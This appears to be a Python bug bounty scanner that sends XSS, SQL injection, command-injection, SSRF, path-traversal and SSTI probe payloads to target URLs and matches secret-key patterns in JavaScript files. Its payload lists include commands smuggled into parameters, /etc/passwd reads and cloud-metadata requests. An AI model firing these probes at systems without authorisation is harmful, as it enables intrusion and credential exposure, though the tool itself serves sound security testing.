#!/usr/bin/env python3
"""
h1_hunter.py — Modular bug bounty framework for HackerOne-scoped targets.

Tests: XSS, SQLi (error/boolean/time), SSRF, IDOR, open redirect,
       path traversal, SSTI, command injection, CORS misconfig,
       security headers, JS secret analysis.

Usage:
    python h1_hunter.py -u https://target.com --all
    python h1_hunter.py -l urls.txt --xss --sqli --ssrf
    python h1_hunter.py -u https://target.com --analyze-js
"""

import argparse
import asyncio
import aiohttp
import json
import re
import sys
import hashlib
import time
import random
import string
import urllib.parse
from dataclasses import dataclass, field, asdict
from typing import Optional
from pathlib import Path
from datetime import datetime
from collections import defaultdict

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None


# ============================================================
# DATA MODEL
# ============================================================

@dataclass
class Finding:
    vuln_type: str
    severity: str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    url: str
    param: str = ""
    payload: str = ""
    evidence: str = ""
    confidence: str = "medium"   # low / medium / high
    remediation: str = ""
    cwe: str = ""

    def to_dict(self):
        return asdict(self)


# ============================================================
# BASE TESTER
# ============================================================

class BaseTester:
    name = "base"
    severity = "INFO"
    cwe = ""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 0.2):
        self.session = session
        self.rate_limit = rate_limit
        self.findings: list[Finding] = []

    async def _request(self, method: str, url: str, **kwargs):
        """Rate-limited request wrapper."""
        await asyncio.sleep(self.rate_limit + random.uniform(0, 0.1))
        kwargs.setdefault("timeout", aiohttp.ClientTimeout(total=15))
        kwargs.setdefault("ssl", False)
        kwargs.setdefault("allow_redirects", False)
        try:
            async with self.session.request(method, url, **kwargs) as resp:
                body = await resp.text(errors="ignore")
                return resp, body
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return None, ""

    def _record(self, **kwargs):
        f = Finding(**kwargs)
        self.findings.append(f)
        return f

    async def run(self, url: str, params: dict):
        raise NotImplementedError


# ============================================================
# TESTER 1: REFLECTED XSS
# ============================================================

class XSSTester(BaseTester):
    name = "xss"
    severity = "HIGH"
    cwe = "CWE-79"

    MARKER = "h1xss" + "".join(random.choices(string.ascii_lowercase, k=6))

    PAYLOADS = [
        f'"><script>alert(1)</script>',
        f"'><img src=x onerror=alert(1)>",
        f'javascript:alert(1)',
        f'{{{{7*7}}}}',          # also catches SSTI accidentally
        f'<svg/onload=alert(1)>',
        f'"onmouseover="alert(1)',
    ]

    async def run(self, url: str, params: dict):
        for param_name in params:
            for payload in self.PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = self.MARKER + payload
                qs = urllib.parse.urlencode(test_params)
                test_url = f"{url}?{qs}"

                resp, body = await self._request("GET", test_url)
                if resp is None:
                    continue

                # Check reflection
                if self.MARKER in body:
                    # Determine if the payload is unencoded in an executable context
                    dangerous = self._is_dangerous_reflection(body, self.MARKER)

                    self._record(
                        vuln_type="Reflected XSS",
                        severity="HIGH" if dangerous else "MEDIUM",
                        url=test_url,
                        param=param_name,
                        payload=payload,
                        evidence=self._extract_context(body, self.MARKER),
                        confidence="high" if dangerous else "medium",
                        remediation="Encode output with context-aware escaping "
                                    "(HTML entity encoding, JS escaping). Use CSP.",
                        cwe="CWE-79",
                    )
                    break  # one finding per param is enough

    @staticmethod
    def _is_dangerous_reflection(body: str, marker: str) -> bool:
        """Check if marker appears inside a script tag or event handler."""
        idx = body.find(marker)
        if idx == -1:
            return False
        window = body[max(0, idx - 200):idx + 200].lower()
        danger_signals = ["<script", "onerror=", "onload=", "javascript:", "<img", "<svg"]
        return any(sig in window for sig in danger_signals)

    @staticmethod
    def _extract_context(body: str, marker: str, width: int = 100) -> str:
        idx = body.find(marker)
        if idx == -1:
            return ""
        start = max(0, idx - width)
        end = min(len(body), idx + width)
        return body[start:end].replace("\n", " ")[:300]


# ============================================================
# TESTER 2: SQL INJECTION (error + boolean + time-based)
# ============================================================

class SQLiTester(BaseTester):
    name = "sqli"
    severity = "CRITICAL"
    cwe = "CWE-89"

    ERROR_PAYLOADS = ["'", '"', "')", "';", "' OR '1'='1", "1'", "1\"", "')--"]
    BOOLEAN_PAIRS = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' OR '1'='1'--", "' OR '1'='2'--"),
    ]
    TIME_PAYLOADS = [
        ("' AND SLEEP(5)--", 5),
        ("'; WAITFOR DELAY '0:0:5'--", 5),
        ("' AND pg_sleep(5)--", 5),
        ("1' AND SLEEP(5)#", 5),
    ]

    ERROR_SIGNATURES = [
        "sql syntax", "mysql_fetch", "ora-01756", "sqlite_", "postgresql",
        "unclosed quotation mark", "microsoft ole db", "odbc sql server",
        "syntax error", "division by zero", "warning: mysql",
    ]

    async def run(self, url: str, params: dict):
        baseline_resp, baseline_body = await self._request("GET", url)
        if baseline_resp is None:
            return

        for param_name in params:
            original = params[param_name]

            # --- Error-based ---
            for payload in self.ERROR_PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = original + payload
                test_url = f"{url}?{urllib.parse.urlencode(test_params)}"
                resp, body = await self._request("GET", test_url)
                if resp is None:
                    continue
                if self._has_sql_error(body):
                    self._record(
                        vuln_type="Error-based SQL Injection",
                        severity="CRITICAL",
                        url=test_url,
                        param=param_name,
                        payload=payload,
                        evidence=self._find_sql_error(body),
                        confidence="high",
                        remediation="Use parameterized queries / prepared statements.",
                        cwe="CWE-89",
                    )
                    return  # critical, stop

            # --- Boolean-based (blind) ---
            for true_payload, false_payload in self.BOOLEAN_PAIRS:
                tp = dict(params); tp[param_name] = original + true_payload
                fp = dict(params); fp[param_name] = original + false_payload

                _, t_body = await self._request("GET", f"{url}?{urllib.parse.urlencode(tp)}")
                _, f_body = await self._request("GET", f"{url}?{urllib.parse.urlencode(fp)}")

                if not t_body or not f_body:
                    continue

                # Compare lengths and content
                len_diff = abs(len(t_body) - len(f_body))
                if len_diff > 50 and (len(t_body) - len(baseline_body)) > 20:
                    # Content-based difference
                    self._record(
                        vuln_type="Boolean-based Blind SQL Injection",
                        severity="CRITICAL",
                        url=f"{url}?{urllib.parse.urlencode(tp)}",
                        param=param_name,
                        payload=true_payload,
                        evidence=f"Response length difference: {len(t_body)} vs {len(f_body)}",
                        confidence="medium",
                        remediation="Use parameterized queries.",
                        cwe="CWE-89",
                    )
                    return

            # --- Time-based (blind) ---
            for payload, delay in self.TIME_PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = original + payload
                test_url = f"{url}?{urllib.parse.urlencode(test_params)}"

                start = time.monotonic()
                resp, _ = await self._request("GET", test_url)
                elapsed = time.monotonic() - start

                if elapsed >= delay * 0.8:
                    self._record(
                        vuln_type="Time-based Blind SQL Injection",
                        severity="CRITICAL",
                        url=test_url,
                        param=param_name,
                        payload=payload,
                        evidence=f"Response delayed {elapsed:.2f}s (expected ~{delay}s)",
                        confidence="high",
                        remediation="Use parameterized queries.",
                        cwe="CWE-89",
                    )
                    return

    def _has_sql_error(self, body: str) -> bool:
        lower = body.lower()
        return any(sig in lower for sig in self.ERROR_SIGNATURES)

    def _find_sql_error(self, body: str) -> str:
        lower = body.lower()
        for sig in self.ERROR_SIGNATURES:
            idx = lower.find(sig)
            if idx != -1:
                return body[max(0, idx - 60):idx + 150].replace("\n", " ")
        return ""


# ============================================================
# TESTER 3: SSRF
# ============================================================

class SSRFTester(BaseTester):
    name = "ssrf"
    severity = "HIGH"
    cwe = "CWE-918"

    # Common SSRF parameter names
    SSRF_PARAMS = [
        "url", "uri", "link", "src", "dest", "redirect", "callback",
        "feed", "host", "port", "path", "target", "out", "view",
        "next", "data", "reference", "site", "html", "file",
        "page", "return", "r", "u", "load", "fetch",
    ]

    # Internal targets to probe
    INTERNAL_TARGETS = [
        ("http://127.0.0.1:80/", "localhost"),
        ("http://localhost:8080/", "localhost alt port"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ("http://[::1]/", "IPv6 loopback"),
        ("file:///etc/passwd", "local file read"),
    ]

    async def run(self, url: str, params: dict):
        # Only test params that look like URL targets
        candidate_params = [p for p in params if p.lower() in self.SSRF_PARAMS]
        # Also try any param whose value looks like a URL
        for p, v in params.items():
            if v.startswith(("http://", "https://", "/")):
                if p not in candidate_params:
                    candidate_params.append(p)

        if not candidate_params:
            return

        for param_name in candidate_params:
            for target_url, label in self.INTERNAL_TARGETS:
                test_params = dict(params)
                test_params[param_name] = target_url
                test_url = f"{url}?{urllib.parse.urlencode(test_params)}"

                resp, body = await self._request("GET", test_url)
                if resp is None:
                    continue

                # Check for signs of internal access
                if self._looks_internal(body, resp.status):
                    self._record(
                        vuln_type="Server-Side Request Forgery (SSRF)",
                        severity="HIGH",
                        url=test_url,
                        param=param_name,
                        payload=target_url,
                        evidence=f"Target: {label}. Response status: {resp.status}. "
                                 f"Snippet: {body[:200]}",
                        confidence="high" if "metadata" in label else "medium",
                        remediation="Validate and whitelist allowed URLs. Block "
                                    "private IP ranges. Disable unnecessary URL schemes.",
                        cwe="CWE-918",
                    )
                    break

    @staticmethod
    def _looks_internal(body: str, status: int) -> bool:
        if status in (200, 301, 302, 403):
            signals = ["root:", "metadata", "instance-id", "localhost",
                       "internal", "amazon", "computeMetadata", "127.0.0.1"]
            lower = body.lower()
            if any(sig in lower for sig in signals):
                return True
        return False


# ============================================================
# TESTER 4: OPEN REDIRECT
# ============================================================

class RedirectTester(BaseTester):
    name = "redirect"
    severity = "MEDIUM"
    cwe = "CWE-601"

    REDIRECT_PARAMS = [
        "url", "redirect", "next", "return", "returnUrl", "goto", "dest",
        "destination", "redir", "redirect_uri", "callback", "continue",
        "forward", "target", "link", "out", "view", "ref",
    ]

    async def run(self, url: str, params: dict):
        candidate = [p for p in params if p.lower() in self.REDIRECT_PARAMS]
        if not candidate:
            return

        evil = "https://evil.example.com/h1test"

        for param_name in candidate:
            test_params = dict(params)
            test_params[param_name] = evil
            test_url = f"{url}?{urllib.parse.urlencode(test_params)}"

            resp, _ = await self._request("GET", test_url)
            if resp is None:
                continue

            location = resp.headers.get("Location", "")
            if "evil.example.com" in location:
                self._record(
                    vuln_type="Open Redirect",
                    severity="MEDIUM",
                    url=test_url,
                    param=param_name,
                    payload=evil,
                    evidence=f"Location header: {location}",
                    confidence="high",
                    remediation="Validate redirect targets against a whitelist. "
                                "Use relative paths or signed tokens.",
                    cwe="CWE-601",
                )


# ============================================================
# TESTER 5: PATH TRAVERSAL / LFI
# ============================================================

class TraversalTester(BaseTester):
    name = "traversal"
    severity = "HIGH"
    cwe = "CWE-22"

    PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "..\\..\\..\\windows\\win.ini",
    ]

    PARAMS = ["file", "path", "page", "include", "doc", "document",
              "folder", "root", "load", "read", "template", "view"]

    async def run(self, url: str, params: dict):
        candidate = [p for p in params if p.lower() in self.PARAMS]
        if not candidate:
            return

        for param_name in candidate:
            for payload in self.PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = payload
                test_url = f"{url}?{urllib.parse.urlencode(test_params)}"

                resp, body = await self._request("GET", test_url)
                if resp is None:
                    continue

                if "root:x:0:0" in body or "root:/root" in body:
                    self._record(
                        vuln_type="Path Traversal / Local File Inclusion",
                        severity="HIGH",
                        url=test_url,
                        param=param_name,
                        payload=payload,
                        evidence="File content disclosed (/etc/passwd detected)",
                        confidence="high",
                        remediation="Never pass user input to filesystem APIs. "
                                    "Use a whitelist of allowed files.",
                        cwe="CWE-22",
                    )
                    break

                if "[fonts]" in body or "for 16-bit app support" in body:
                    self._record(
                        vuln_type="Path Traversal (Windows)",
                        severity="HIGH",
                        url=test_url,
                        param=param_name,
                        payload=payload,
                        evidence="File content disclosed (win.ini detected)",
                        confidence="high",
                        remediation="Never pass user input to filesystem APIs.",
                        cwe="CWE-22",
                    )
                    break


# ============================================================
# TESTER 6: SSTI
# ============================================================

class SSTITester(BaseTester):
    name = "ssti"
    severity = "CRITICAL"
    cwe = "CWE-1336"

    PAYLOADS = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{{7*'7'}}", "7777777"),
        ("#{7*7}", "49"),
    ]

    async def run(self, url: str, params: dict):
        for param_name in params:
            for payload, expected in self.PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = payload
                test_url = f"{url}?{urllib.parse.urlencode(test_params)}"

                resp, body = await self._request("GET", test_url)
                if resp is None:
                    continue

                if expected in body and payload not in body:
                    self._record(
                        vuln_type="Server-Side Template Injection (SSTI)",
                        severity="CRITICAL",
                        url=test_url,
                        param=param_name,
                        payload=payload,
                        evidence=f"Payload '{payload}' evaluated to '{expected}'",
                        confidence="high",
                        remediation="Never render user input as template code. "
                                    "Use sandboxed template engines and context-aware escaping.",
                        cwe="CWE-1336",
                    )
                    break


# ============================================================
# TESTER 7: COMMAND INJECTION
# ============================================================

class CmdInjectionTester(BaseTester):
    name = "cmdi"
    severity = "CRITICAL"
    cwe = "CWE-78"

    # Time-based probes to avoid destructive commands
    PAYLOADS = [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        ("& ping -n 6 127.0.0.1 &", 5),   # Windows
    ]

    PARAMS = ["cmd", "exec", "command", "ping", "host", "ip", "domain",
              "query", "search", "run", "system", "process"]

    async def run(self, url: str, params: dict):
        candidate = [p for p in params if p.lower() in self.PARAMS]
        if not candidate:
            return

        for param_name in candidate:
            for payload, delay in self.PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = params[param_name] + payload
                test_url = f"{url}?{urllib.parse.urlencode(test_params)}"

                start = time.monotonic()
                resp, _ = await self._request("GET", test_url)
                elapsed = time.monotonic() - start

                if elapsed >= delay * 0.8:
                    self._record(
                        vuln_type="OS Command Injection",
                        severity="CRITICAL",
                        url=test_url,
                        param=param_name,
                        payload=payload,
                        evidence=f"Time delay: {elapsed:.2f}s (expected ~{delay}s)",
                        confidence="high",
                        remediation="Avoid shell calls with user input. "
                                    "Use language-native APIs and strict input validation.",
                        cwe="CWE-78",
                    )
                    break


# ============================================================
# TESTER 8: CORS MISCONFIGURATION
# ============================================================

class CORSTester(BaseTester):
    name = "cors"
    severity = "MEDIUM"
    cwe = "CWE-942"

    async def run(self, url: str, params: dict):
        evil_origin = "https://evil.example.com"

        headers = {"Origin": evil_origin}
        resp, body = await self._request("GET", url, headers=headers)
        if resp is None:
            return

        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")

        if acao == evil_origin and acac.lower() == "true":
            self._record(
                vuln_type="CORS Misconfiguration (Reflected Origin + Credentials)",
                severity="HIGH",
                url=url,
                evidence=f"ACAO: {acao}, ACAC: {acac}",
                confidence="high",
                remediation="Whitelist allowed origins. Never reflect arbitrary "
                            "Origin headers when credentials are enabled.",
                cwe="CWE-942",
            )
        elif acao == "*" and acac.lower() == "true":
            self._record(
                vuln_type="CORS Wildcard with Credentials",
                severity="HIGH",
                url=url,
                evidence=f"ACAO: {acao}, ACAC: {acac}",
                confidence="high",
                remediation="Do not use wildcard origin with credentials.",
                cwe="CWE-942",
            )
        elif acao == evil_origin:
            self._record(
                vuln_type="CORS Origin Reflection",
                severity="MEDIUM",
                url=url,
                evidence=f"ACAO: {acao}",
                confidence="medium",
                remediation="Validate Origin against a whitelist.",
                cwe="CWE-942",
            )


# ============================================================
# TESTER 9: SECURITY HEADERS (INFO)
# ============================================================

class HeaderTester(BaseTester):
    name = "headers"
    severity = "INFO"
    cwe = "CWE-693"

    EXPECTED = {
        "Strict-Transport-Security": "HSTS not set",
        "X-Content-Type-Options": "MIME sniffing protection missing",
        "X-Frame-Options": "Clickjacking protection missing",
        "Content-Security-Policy": "CSP not set",
        "Referrer-Policy": "Referrer policy not set",
    }

    async def run(self, url: str, params: dict):
        resp, body = await self._request("GET", url)
        if resp is None:
            return

        missing = []
        for header, desc in self.EXPECTED.items():
            if header not in resp.headers:
                missing.append(f"{header} ({desc})")

        # Check for server version disclosure
        server = resp.headers.get("Server", "")
        powered = resp.headers.get("X-Powered-By", "")

        if missing:
            self._record(
                vuln_type="Missing Security Headers",
                severity="INFO",
                url=url,
                evidence="; ".join(missing),
                confidence="high",
                remediation="Add the listed security headers with appropriate values.",
                cwe="CWE-693",
            )

        if server or powered:
            self._record(
                vuln_type="Information Disclosure (Version)",
                severity="LOW",
                url=url,
                evidence=f"Server: {server}, X-Powered-By: {powered}",
                confidence="high",
                remediation="Remove or obfuscate version banners.",
                cwe="CWE-200",
            )


# ============================================================
# TESTER 10: IDOR (parameter-based heuristic)
# ============================================================

class IDORTester(BaseTester):
    name = "idor"
    severity = "HIGH"
    cwe = "CWE-639"

    # Params that commonly control object access
    ID_PARAMS = ["id", "user", "user_id", "uid", "account", "account_id",
                 "profile", "order", "order_id", "invoice", "doc", "document_id",
                 "file", "file_id", "record", "record_id", "item", "item_id"]

    async def run(self, url: str, params: dict):
        candidates = [p for p in params if p.lower() in self.ID_PARAMS]
        if not candidates:
            return

        for param_name in candidates:
            original = params[param_name]
            if not original.isdigit():
                continue

            base_id = int(original)

            # Test nearby IDs
            for delta in (-2, -1, 1, 2, 10, 100):
                test_id = base_id + delta
                if test_id < 1:
                    continue

                test_params = dict(params)
                test_params[param_name] = str(test_id)
                test_url = f"{url}?{urllib.parse.urlencode(test_params)}"

                resp, body = await self._request("GET", test_url)
                if resp is None:
                    continue

                # Heuristic: if we get a 200 and the body differs
                # from a "not found" page, flag it.
                if resp.status == 200 and self._looks_like_object(body):
                    # Check for PII indicators
                    pii = self._detect_pii(body)
                    if pii:
                        self._record(
                            vuln_type="Potential IDOR (Insecure Direct Object Reference)",
                            severity="HIGH",
                            url=test_url,
                            param=param_name,
                            payload=str(test_id),
                            evidence=f"PII indicators: {', '.join(pii)}. "
                                     f"Snippet: {body[:200]}",
                            confidence="medium",
                            remediation="Implement server-side authorization checks "
                                        "on every object access. Use unpredictable IDs.",
                            cwe="CWE-639",
                        )
                        break

    @staticmethod
    def _looks_like_object(body: str) -> bool:
        if not body:
            return False
        lower = body.lower()
        not_found_signals = ["not found", "404", "does not exist", "no such"]
        return not any(sig in lower for sig in not_found_signals)

    @staticmethod
    def _detect_pii(body: str) -> list[str]:
        indicators = []
        if re.search(r"[\w\.-]+@[\w\.-]+\.\w+", body):
            indicators.append("email")
        if re.search(r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b", body):
            indicators.append("phone")
        if re.search(r"\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b", body):
            indicators.append("credit_card")
        if re.search(r"\b\d{3}-\d{2}-\d{4}\b", body):
            indicators.append("ssn")
        return indicators


# ============================================================
# JS ANALYZER (reuses your earlier secret patterns)
# ============================================================

class JSAnalyzer:
    """Download JS files and scan for secrets + endpoints."""

    SECRET_PATTERNS = [
        ("AWS Access Key", r"AKIA[0-9A-Z]{16}", "CRITICAL"),
        ("AWS Secret Key", r"(?i)aws.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]", "CRITICAL"),
        ("Google API Key", r"AIza[0-9A-Za-z\-_]{35}", "HIGH"),
        ("GitHub Token", r"gh[pousr]_[A-Za-z0-9_]{36,255}", "CRITICAL"),
        ("Slack Token", r"xox[baprs]-[0-9a-zA-Z]{10,48}", "CRITICAL"),
        ("Stripe Live Key", r"sk_live_[0-9a-zA-Z]{24}", "CRITICAL"),
        ("SendGrid Key", r"SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}", "CRITICAL"),
        ("Private Key", r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", "CRITICAL"),
        ("JWT", r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}", "MEDIUM"),
        ("Generic API Key", r"(?i)(api[_\-]?key|apikey)['\"\s:=]+['\"]?([a-zA-Z0-9_\-]{16,64})", "MEDIUM"),
    ]

    ENDPOINT_PATTERN = re.compile(
        r"""["'](/(?:api|v\d|graphql|rest|auth|user|admin|internal|debug|config)[^"']*)["']""",
        re.IGNORECASE,
    )

    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
        self.findings: list[Finding] = []

    async def analyze(self, js_url: str):
        try:
            async with self.session.get(js_url, timeout=aiohttp.ClientTimeout(total=20),
                                         ssl=False) as resp:
                if resp.status != 200:
                    return
                content = await resp.text(errors="ignore")
        except Exception:
            return

        for name, pattern, severity in self.SECRET_PATTERNS:
            for match in re.finditer(pattern, content):
                matched = match.group(0)
                if len(set(matched)) < 4:
                    continue  # skip low-entropy
                line = content[:match.start()].count("\n") + 1
                self.findings.append(Finding(
                    vuln_type=f"JS Secret: {name}",
                    severity=severity,
                    url=js_url,
                    payload=matched[:120],
                    evidence=f"Line {line}: {matched[:120]}",
                    confidence="high" if severity == "CRITICAL" else "medium",
                    remediation="Rotate the leaked secret immediately. Remove from "
                                "client-side code. Use server-side proxies.",
                    cwe="CWE-798",
                ))

        # Extract endpoints
        endpoints = set(self.ENDPOINT_PATTERN.findall(content))
        if endpoints:
            self.findings.append(Finding(
                vuln_type="JS Endpoint Discovery",
                severity="INFO",
                url=js_url,
                evidence=f"Found {len(endpoints)} potential endpoints: "
                         f"{', '.join(list(endpoints)[:10])}",
                confidence="medium",
                remediation="Review exposed endpoints for missing authorization.",
                cwe="CWE-200",
            ))


# ============================================================
# ORCHESTRATOR
# ============================================================

class Hunter:
    def __init__(self, rate_limit: float = 0.2, concurrency: int = 5):
        self.rate_limit = rate_limit
        self.concurrency = concurrency
        self.all_findings: list[Finding] = []

    async def scan_url(self, url: str, enabled: set[str]):
        # Parse URL
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))

        # If no query params, still run header/CORS checks
        async with aiohttp.ClientSession() as session:
            testers = []

            if "xss" in enabled:
                testers.append(XSSTester(session, self.rate_limit))
            if "sqli" in enabled:
                testers.append(SQLiTester(session, self.rate_limit))
            if "ssrf" in enabled:
                testers.append(SSRFTester(session, self.rate_limit))
            if "redirect" in enabled:
                testers.append(RedirectTester(session, self.rate_limit))
            if "traversal" in enabled:
                testers.append(TraversalTester(session, self.rate_limit))
            if "ssti" in enabled:
                testers.append(SSTITester(session, self.rate_limit))
            if "cmdi" in enabled:
                testers.append(CmdInjectionTester(session, self.rate_limit))
            if "cors" in enabled:
                testers.append(CORSTester(session, self.rate_limit))
            if "headers" in enabled:
                testers.append(HeaderTester(session, self.rate_limit))
            if "idor" in enabled:
                testers.append(IDORTester(session, self.rate_limit))

            for tester in testers:
                try:
                    await tester.run(url, params)
                    self.all_findings.extend(tester.findings)
                    if tester.findings:
                        print(f"  [{tester.name.upper()}] {len(tester.findings)} finding(s)")
                except Exception as e:
                    print(f"  [{tester.name.upper()}] error: {e}")

    async def run(self, urls: list[str], enabled: set[str]):
        sem = asyncio.Semaphore(self.concurrency)

        async def _worker(u):
            async with sem:
                print(f"\n[*] Scanning: {u}")
                await self.scan_url(u, enabled)

        await asyncio.gather(*[_worker(u) for u in urls])


# ============================================================
# REPORTING
# ============================================================

SEVERITY_COLOR = {
    "CRITICAL": "\033[95m", "HIGH": "\033[91m",
    "MEDIUM": "\033[93m", "LOW": "\033[94m",
    "INFO": "\033[90m",
}
RESET = "\033[0m"
BOLD = "\033[1m"


def print_report(findings: list[Finding]):
    if not findings:
        print(f"\n{BOLD}\033[92m[+] No vulnerabilities found.{RESET}")
        return

    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda f: (order.get(f.severity, 99), f.vuln_type))

    counts = defaultdict(int)
    for f in findings:
        counts[f.severity] += 1

    print(f"\n{BOLD}{'=' * 72}{RESET}")
    print(f"{BOLD}  FINDINGS: {len(findings)}{RESET}")
    print(f"{BOLD}{'=' * 72}{RESET}")

    for f in findings:
        color = SEVERITY_COLOR.get(f.severity, "")
        print(f"\n{color}[{f.severity}]{RESET} {BOLD}{f.vuln_type}{RESET}")
        print(f"  URL:    {f.url}")
        if f.param:
            print(f"  Param:  {f.param}")
        if f.payload:
            print(f"  Payload:{f.payload}")
        if f.evidence:
            print(f"  Evidence: {f.evidence}")
        if f.remediation:
            print(f"  Fix:    {f.remediation}")
        if f.cwe:
            print(f"  {f.cwe}")

    print(f"\n{BOLD}Summary:{RESET} ", end="")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if counts[sev]:
            c = SEVERITY_COLOR[sev]
            print(f"{c}{sev}={counts[sev]}{RESET} ", end="")
    print()


def save_report(findings: list[Finding], json_path: str, txt_path: str):
    with open(json_path, "w") as f:
        json.dump([f.to_dict() for f in findings], f, indent=2)

    with open(txt_path, "w") as f:
        f.write("H1 Hunter Report\n")
        f.write(f"Generated: {datetime.utcnow().isoformat()}\n")
        f.write(f"Total: {len(findings)}\n")
        f.write("=" * 72 + "\n")
        for find in findings:
            f.write(f"\n[{find.severity}] {find.vuln_type}\n")
            f.write(f"  URL: {find.url}\n")
            if find.param:
                f.write(f"  Param: {find.param}\n")
            if find.payload:
                f.write(f"  Payload: {find.payload}\n")
            f.write(f"  Evidence: {find.evidence}\n")
            f.write(f"  Fix: {find.remediation}\n")
            if find.cwe:
                f.write(f"  {find.cwe}\n")

    print(f"\n[+] JSON report: {json_path}")
    print(f"[+] Text report: {txt_path}")


# ============================================================
# MAIN
# ============================================================

ALL_MODULES = {"xss", "sqli", "ssrf", "redirect", "traversal",
               "ssti", "cmdi", "cors", "headers", "idor"}


def main():
    parser = argparse.ArgumentParser(
        description="Modular bug bounty framework for HackerOne-scoped targets.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-u", "--url", help="Single target URL (with query params)")
    parser.add_argument("-l", "--list", help="File with URLs (one per line)")
    parser.add_argument("--all", action="store_true", help="Enable all modules")
    parser.add_argument("--xss", action="store_true")
    parser.add_argument("--sqli", action="store_true")
    parser.add_argument("--ssrf", action="store_true")
    parser.add_argument("--redirect", action="store_true")
    parser.add_argument("--traversal", action="store_true")
    parser.add_argument("--ssti", action="store_true")
    parser.add_argument("--cmdi", action="store_true")
    parser.add_argument("--cors", action="store_true")
    parser.add_argument("--headers", action="store_true")
    parser.add_argument("--idor", action="store_true")
    parser.add_argument("--analyze-js", metavar="JS_URL",
                        help="Analyze a JS file for secrets and endpoints")
    parser.add_argument("--rate", type=float, default=0.2,
                        help="Delay between requests in seconds (default: 0.2)")
    parser.add_argument("--concurrency", type=int, default=5)
    parser.add_argument("--json-out", default="h1_findings.json")
    parser.add_argument("--txt-out", default="h1_findings.txt")

    args = parser.parse_args()

    # Build enabled module set
    if args.all:
        enabled = set(ALL_MODULES)
    else:
        enabled = set()
        for m in ALL_MODULES:
            if getattr(args, m, False):
                enabled.add(m)

    # JS analysis mode
    if args.analyze_js:
        async def _js():
            async with aiohttp.ClientSession() as s:
                analyzer = JSAnalyzer(s)
                await analyzer.analyze(args.analyze_js)
                print_report(analyzer.findings)
                if analyzer.findings:
                    save_report(analyzer.findings, args.json_out, args.txt_out)
        asyncio.run(_js())
        return

    # Collect URLs
    urls = []
    if args.url:
        urls.append(args.url)
    if args.list:
        with open(args.list) as f:
            urls.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])

    if not urls:
        print("[!] No URLs provided. Use -u or -l.")
        sys.exit(1)

    if not enabled:
        print("[!] No modules selected. Use --all or individual flags.")
        sys.exit(1)

    print(f"{BOLD}H1 Hunter{RESET}")
    print(f"  Targets:    {len(urls)}")
    print(f"  Modules:    {', '.join(sorted(enabled))}")
    print(f"  Rate limit: {args.rate}s")
    print(f"  Workers:    {args.concurrency}")

    hunter = Hunter(rate_limit=args.rate, concurrency=args.concurrency)
    asyncio.run(hunter.run(urls, enabled))

    print_report(hunter.all_findings)
    if hunter.all_findings:
        save_report(hunter.all_findings, args.json_out, args.txt_out)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(130)
